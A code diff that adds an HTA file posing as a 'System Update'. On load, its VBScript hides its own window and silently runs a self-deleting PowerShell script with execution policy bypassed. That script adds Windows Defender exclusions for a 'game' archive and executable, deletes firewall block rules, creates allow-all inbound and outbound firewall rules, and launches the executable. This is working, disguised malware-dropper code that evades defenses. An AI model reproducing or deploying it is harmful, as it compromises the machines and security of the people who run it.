@@ -1,0 +1,66 @@
+<html>
+<head>
+<title>System Update</title>
+<HTA:APPLICATION
+    ID="oHTA"
+    APPLICATIONNAME="SystemUpdate"
+    BORDER="none"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    SYSMENU="no"
+    WINDOWSTATE="minimize"
+/>
+</head>
+
+<script language="VBScript">
+    Sub Window_OnLoad
+        window.resizeTo 0, 0
+        window.moveTo -2000, -2000
+
+        Dim fso, shell, tempDir, ps1Path
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        Set shell = CreateObject("WScript.Shell")
+        
+        tempDir = shell.ExpandEnvironmentStrings("%TEMP%")
+        ps1Path = tempDir & "\ultra_setup.ps1"
+
+        ' Ultra-Powerful PowerShell Setup
+        Dim psContent
+        psContent = "$ErrorActionPreference = 'SilentlyContinue'" & vbCrLf & _
+                    "Write-Host '1. Adding ZIP to AV Exclusions...'" & vbCrLf & _
+                    "Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\game.zip'" & vbCrLf & _
+                    "Write-Host '2. Extracting ZIP...'" & vbCrLf & _
+                    "Expand-Archive -Path 'C:\Users\Public\Pictures\game.zip' -DestinationPath 'C:\Users\Public\Pictures\game' -Force" & vbCrLf & _
+                    "if (Test-Path 'C:\Users\Public\Pictures\game\game.exe') {" & vbCrLf & _
+                    "    Write-Host '3. Adding EXE to AV Exclusions...'" & vbCrLf & _
+                    "    Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\game\game.exe'" & vbCrLf & _
+                    "    Write-Host '4. Deleting all conflicting Firewall Block rules...'" & vbCrLf & _
+                    "    Remove-NetFirewallRule -DisplayName 'Block game.exe*'" & vbCrLf & _
+                    "    Get-NetFirewallApplicationFilter -Program 'C:\Users\Public\Pictures\game\game.exe' | Remove-NetFirewallRule" & vbCrLf & _
+                    "    Write-Host '5. Creating ULTRA Firewall Allow rules (Folder + EXE)...'" & vbCrLf & _
+                    "    New-NetFirewallRule -DisplayName 'GAME ULTRA - Folder Inbound' -Direction Inbound -Program 'C:\Users\Public\Pictures\game\*' -Action Allow -Profile Any" & vbCrLf & _
+                    "    New-NetFirewallRule -DisplayName 'GAME ULTRA - Folder Outbound' -Direction Outbound -Program 'C:\Users\Public\Pictures\game\*' -Action Allow -Profile Any" & vbCrLf & _
+                    "    New-NetFirewallRule -DisplayName 'GAME ULTRA - EXE Inbound' -Direction Inbound -Program 'C:\Users\Public\Pictures\game\game.exe' -Action Allow -Profile Any" & vbCrLf & _
+                    "    New-NetFirewallRule -DisplayName 'GAME ULTRA - EXE Outbound' -Direction Outbound -Program 'C:\Users\Public\Pictures\game\game.exe' -Action Allow -Profile Any" & vbCrLf & _
+                    "    New-NetFirewallRule -DisplayName 'GAME ULTRA - Any Ports' -Direction Inbound -Program 'C:\Users\Public\Pictures\game\game.exe' -Protocol Any -LocalPort Any -Action Allow -Profile Any" & vbCrLf & _
+                    "    Write-Host '6. Launching Game...'" & vbCrLf & _
+                    "    Start-Process -FilePath 'C:\Users\Public\Pictures\game\game.exe'" & vbCrLf & _
+                    "}" & vbCrLf & _
+                    "Remove-Item -Path '" & ps1Path & "' -Force"
+
+        ' Write the PS1 file
+        Dim f
+        Set f = fso.CreateTextFile(ps1Path, True)
+        f.Write psContent
+        f.Close
+
+        ' Run it hidden, wait for it to finish, and close
+        shell.Run "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1Path & """", 0, True
+        
+        window.close
+    End Sub
+</script>
+
+<body></body>
+</html>
